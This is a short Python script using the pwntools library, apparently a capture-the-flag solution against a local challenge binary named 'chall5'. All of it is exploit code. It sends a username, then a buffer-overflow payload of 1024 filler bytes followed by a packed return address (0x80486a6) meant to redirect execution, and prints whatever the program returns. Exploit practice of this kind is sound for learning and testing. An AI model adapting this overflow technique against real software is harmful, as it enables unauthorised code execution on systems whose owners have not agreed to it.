from pwn import *
addr = p32(0x80486a6)
buf_size = 1024

payload = b'A'*1024 + addr

proc = process('./chall5')
proc.sendlineafter(b":", 'username')
proc.sendlineafter(b":", payload)
print(proc.recvall(timeout=2).decode())
